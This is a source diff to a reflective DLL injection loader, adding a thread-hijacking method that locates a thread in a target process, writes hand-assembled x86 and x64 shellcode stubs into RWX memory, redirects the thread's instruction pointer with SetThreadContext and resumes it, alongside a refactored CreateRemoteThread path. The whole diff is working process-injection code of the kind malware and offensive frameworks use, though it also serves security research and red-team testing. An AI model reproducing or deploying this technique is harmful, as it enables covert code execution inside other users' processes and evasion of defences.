@@ -27,6 +27,9 @@
 //===============================================================================================//
 #include "LoadLibraryR.h"
 #include <stdio.h>
+#include <TlHelp32.h>
+#include <assert.h>
+
 //===============================================================================================//
 DWORD Rva2Offset( DWORD dwRva, UINT_PTR uiBaseAddress )
 {    
@@ -61,6 +64,7 @@ DWORD GetReflectiveLoaderOffset( VOID * lpReflectiveDllBuffer )
 #if _M_X64
 	DWORD dwCompiledArch = 2;
 #else
+	// This will catch Win32 and WinRT.
 	DWORD dwCompiledArch = 1;
 #endif
 
@@ -184,50 +188,279 @@ HMODULE WINAPI LoadLibraryR( LPVOID lpBuffer, DWORD dwLength )
 // Note: If you are passing in an lpParameter value, if it is a pointer, remember it is for a different address space.
 // Note: This function currently cant inject accross architectures, but only to architectures which are the 
 //       same as the arch this function is compiled as, e.g. x86->x86 and x64->x64 but not x64->x86 or x86->x64.
-HANDLE WINAPI LoadRemoteLibraryR( HANDLE hProcess, LPVOID lpBuffer, DWORD dwLength, LPVOID lpParameter )
+
+BOOL InjectUsingCreateRemoteThread(HANDLE hProcess, LPTHREAD_START_ROUTINE lpReflectiveLoader, PVOID lpParameter)
 {
-	BOOL bSuccess                             = FALSE;
+    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 1024 * 1024, lpReflectiveLoader, lpParameter, 0, NULL);
+
+    if (hThread)
+    {
+        CloseHandle(hThread);
+    }
+
+    return !!hThread;
+}
+
+#if _M_X64
+const unsigned char shell[] =
+{
+    0x90,
+    0x50,                                           // push        rax
+    0x50,                                           // push        rax
+    0x53,                                           // push        rbx
+    0x51,                                           // push        rcx
+    0x52,                                           // push        rdx
+    0x55,                                           // push        rbp
+    0x56,                                           // push        rsi
+    0x57,                                           // push        rdi
+    0x54,                                           // push        rsp
+    0x41, 0x50,                                     // push        r8
+    0x41, 0x51,                                     // push        r9
+    0x41, 0x52,                                     // push        r10
+    0x41, 0x53,                                     // push        r11
+    0x41, 0x54,                                     // push        r12
+    0x41, 0x55,                                     // push        r13
+    0x41, 0x56,                                     // push        r14
+    0x41, 0x57,                                     // push        r15
+    0x90,//0x9C,                                           // pushfq
+    0x48, 0xB8, 0,0,0,0,0,0,0,0,                    // mov         rax,1122334455667788h RIP
+    0x48, 0x89, 0x84, 0x24, 0x80 /*0x88*/, 0x00, 0x00, 0x00, // mov         qword ptr[rsp + 88h],rax
+    0x48, 0xB8, 0,0,0,0,0,0,0,0,                    // mov         rax,1122334455667788h ARG
+    0x48, 0x8B, 0xC8,                               // mov         rcx,rax
+    0x48, 0xB8, 0,0,0,0,0,0,0,0,                    // mov         rax,1122334455667788h FUNC
+
+    0x41, 0x57,                                     // push        r15
+    0x41, 0x57,                                     // push        r15
+    0x41, 0x57,                                     // push        r15
+    0x41, 0x57,                                     // push        r15
+
+    0xFF, 0xD0,                                     // call        rax
+
+    0x41, 0x5F,                                     // pop         r15
+    0x41, 0x5F,                                     // pop         r15
+    0x41, 0x5F,                                     // pop         r15
+    0x41, 0x5F,                                     // pop         r15
+
+    0x41, 0x5F,                                     // pop         r15
+    0x41, 0x5E,                                     // pop         r14
+    0x41, 0x5D,                                     // pop         r13
+    0x41, 0x5C,                                     // pop         r12
+    0x41, 0x5B,                                     // pop         r11
+    0x41, 0x5A,                                     // pop         r10
+    0x41, 0x59,                                     // pop         r9
+    0x41, 0x58,                                     // pop         r8
+    0x5C,                                           // pop         rsp
+    0x5F,                                           // pop         rdi
+    0x5E,                                           // pop         rsi
+    0x5D,                                           // pop         rbp
+    0x5A,                                           // pop         rdx
+    0x59,                                           // pop         rcx
+    0x5B,                                           // pop         rbx
+    0x58,                                           // pop         rax
+    0x90,//0x9D,                                           // popfq
+    0xC3,                                           // ret
+};
+#elif _M_IX86
+const unsigned char shell[] =
+{
+    0x90,
+    0x50,                   //push        eax
+    0x60,                   //pushad
+    0x9C,                   //pushfd
+    0xB8, 0, 0, 0, 0,       //mov         eax,11223344h
+    0x89, 0x44, 0x24, 0x24,       //mov         dword ptr[esp + 24h],eax
+    0xB8, 0, 0, 0, 0,       //mov         eax,11223344h
+    0x50,                   //push        eax
+    0xB8, 0, 0, 0, 0,       //mov         eax,11223344h
+    0xFF, 0xD0,             //call        eax
+    0x9D,                   //popfd
+    0x61,                   //popad
+    0xC3,                   //ret
+    0xcc
+};
+#endif
+
+DWORD WINAPI DummyThreadFn(LPVOID lpThreadParamete)
+{
+    for (;;)
+        Sleep(10);
+}
+
+BOOL InjectUsingSetThreadContext(HANDLE hProcess, LPTHREAD_START_ROUTINE lpReflectiveLoader, PVOID lpParameter)
+{
+    PDWORD pdw = 0;
+    PDWORD64 pdw64 = 0;
+    THREADENTRY32 te32;
+    CONTEXT ctx;
+    LPBYTE ptr = 0;
+    PVOID mem = 0;
+    int found = 0;
+    HANDLE hSnap = NULL;
+    DWORD processId = GetProcessId(hProcess);
+    DWORD currentThreadId = GetCurrentThreadId();
+    DWORD targetThreadId = 0;
+    HANDLE targetThread = NULL;
+    
+    if (processId == GetCurrentProcessId())
+    {
+        CreateThread(NULL, 0, DummyThreadFn, 0, 0, NULL);
+        YieldProcessor();
+    }
+
+    hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);;
+
+    te32.dwSize = sizeof(te32);
+    ctx.ContextFlags = CONTEXT_FULL;
+
+    Thread32First(hSnap, &te32);
+    printf("\nFinding a thread to hijack.\n");
+
+    while (Thread32Next(hSnap, &te32))
+    {
+        if (te32.th32OwnerProcessID == processId)
+        {
+            if (currentThreadId == te32.th32ThreadID)
+            {
+                continue;
+            }
+
+            targetThreadId = te32.th32ThreadID;
+
+            printf("\nTarget thread found. Thread ID: %d", targetThreadId);
+
+            printf("\nAllocating memory in target process.");
+
+            mem = VirtualAllocEx(hProcess, NULL, 4096, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+
+            if (!mem)
+            {
+                printf("\nError: Unable to allocate memory in target process (%d)", GetLastError());
+                continue;
+            }
+
+            printf("\nMemory allocated at %p", mem);
+            printf("\nOpening target thread handle %d.", targetThreadId);
+
+            targetThread = OpenThread(THREAD_ALL_ACCESS, FALSE, targetThreadId);
+
+            if (!targetThread)
+            {
+                printf("\nError: Unable to open target thread handle (%d)\n", GetLastError());
+                continue;
+            }
+
+            printf("\nSuspending target thread.");
+
+            SuspendThread(targetThread);
+            if (!GetThreadContext(targetThread, &ctx))
+            {
+                printf("\n Error: GetThreadContext failed %d\n", GetLastError());
+                ResumeThread(targetThread);
+                continue;
+            }
+
+            // shellcode
+            ptr = (LPBYTE)VirtualAlloc(NULL, 65536, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+            if (!ptr)
+            {
+                ResumeThread(targetThread);
+                printf("\nError: no memory\n");
+                continue;
+            }
+
+            memcpy(ptr, shell, sizeof(shell));
+
+#if _M_IX86
+            pdw = (PDWORD)(((char*)ptr) + 5);
+            *pdw = ctx.Eip;
+
+            pdw = (PDWORD)(((char*)ptr) + 14);
+            *pdw = (DWORD_PTR)lpParameter;
+
+            pdw = (PDWORD)(((char*)ptr) + 20);
+            *pdw = (DWORD_PTR)lpReflectiveLoader;
+#elif _M_X64
+            pdw64 = (PDWORD64)(((char*)ptr) + 29);
+            assert(0 == *pdw64);
+            *pdw64 = ctx.Rip;
+
+            pdw64 = (PDWORD64)(((char*)ptr) + 47);
+            assert(0 == *pdw64);
+            *pdw64 = (DWORD_PTR)lpParameter;
+
+            pdw64 = (PDWORD64)(((char*)ptr) + 60);
+            assert(0 == *pdw64);
+            *pdw64 = (DWORD_PTR)lpReflectiveLoader;
+#endif
+
+            printf("\nWriting shellcode into target process.");
+
+            if (!WriteProcessMemory(hProcess, mem, ptr, sizeof(shell) + 10, NULL))
+            {
+                ResumeThread(targetThread);
+                continue;
+            }
+
+#if _M_X64
+            ctx.Rip = (DWORD64)mem;
+#elif _M_IX86
+            ctx.Eip = (DWORD)mem;
+#endif
+
+            printf("\nHijacking target thread.");
+
+            if (!SetThreadContext(targetThread, &ctx))
+            {
+                printf("\nError: Unable to hijack target thread (%d)\n", GetLastError());
+                ResumeThread(targetThread);
+                continue;
+            }
+
+            printf("\nResuming target thread.");
+
+            ResumeThread(targetThread);
+            CloseHandle(targetThread);
+        }
+    }
+    
+    return TRUE;
+}
+
+BOOL WINAPI LoadRemoteLibraryR( HANDLE hProcess, LPVOID lpBuffer, DWORD dwLength, LPVOID lpParameter, InjectType injectType)
+{
 	LPVOID lpRemoteLibraryBuffer              = NULL;
 	LPTHREAD_START_ROUTINE lpReflectiveLoader = NULL;
-	HANDLE hThread                            = NULL;
 	DWORD dwReflectiveLoaderOffset            = 0;
-	DWORD dwThreadId                          = 0;
 
-	__try
-	{
-		do
-		{
-			if( !hProcess  || !lpBuffer || !dwLength )
-				break;
+    if (!hProcess || !lpBuffer || !dwLength)
+        return FALSE;
 
-			// check if the library has a ReflectiveLoader...
-			dwReflectiveLoaderOffset = GetReflectiveLoaderOffset( lpBuffer );
-			if( !dwReflectiveLoaderOffset )
-				break;
+	// check if the library has a ReflectiveLoader...
+	dwReflectiveLoaderOffset = GetReflectiveLoaderOffset( lpBuffer );
+    if (!dwReflectiveLoaderOffset)
+        return FALSE;
 
-			// alloc memory (RWX) in the host process for the image...
-			lpRemoteLibraryBuffer = VirtualAllocEx( hProcess, NULL, dwLength, MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE ); 
-			if( !lpRemoteLibraryBuffer )
-				break;
+	// alloc memory (RWX) in the host process for the image...
+	lpRemoteLibraryBuffer = VirtualAllocEx( hProcess, NULL, dwLength, MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE ); 
+    if (!lpRemoteLibraryBuffer)
+        return FALSE;
 
-			// write the image into the host process...
-			if( !WriteProcessMemory( hProcess, lpRemoteLibraryBuffer, lpBuffer, dwLength, NULL ) )
-				break;
+	// write the image into the host process...
+    if (!WriteProcessMemory(hProcess, lpRemoteLibraryBuffer, lpBuffer, dwLength, NULL))
+        return FALSE;
 			
-			// add the offset to ReflectiveLoader() to the remote library address...
-			lpReflectiveLoader = (LPTHREAD_START_ROUTINE)( (ULONG_PTR)lpRemoteLibraryBuffer + dwReflectiveLoaderOffset );
+	// add the offset to ReflectiveLoader() to the remote library address...
+	lpReflectiveLoader = (LPTHREAD_START_ROUTINE)( (ULONG_PTR)lpRemoteLibraryBuffer + dwReflectiveLoaderOffset );
 
-			// create a remote thread in the host process to call the ReflectiveLoader!
-			hThread = CreateRemoteThread( hProcess, NULL, 1024*1024, lpReflectiveLoader, lpParameter, (DWORD)NULL, &dwThreadId );
+    switch (injectType)
+    {
+    case kCreateRemoteThread:
+        return InjectUsingCreateRemoteThread(hProcess, lpReflectiveLoader, lpParameter);
 
-		} while( 0 );
+    case kSetThreadContext:
+        return InjectUsingSetThreadContext(hProcess, lpReflectiveLoader, lpParameter);
+    }
 
-	}
-	__except( EXCEPTION_EXECUTE_HANDLER )
-	{
-		hThread = NULL;
-	}
-
-	return hThread;
+    return FALSE;
 }
 //===============================================================================================//
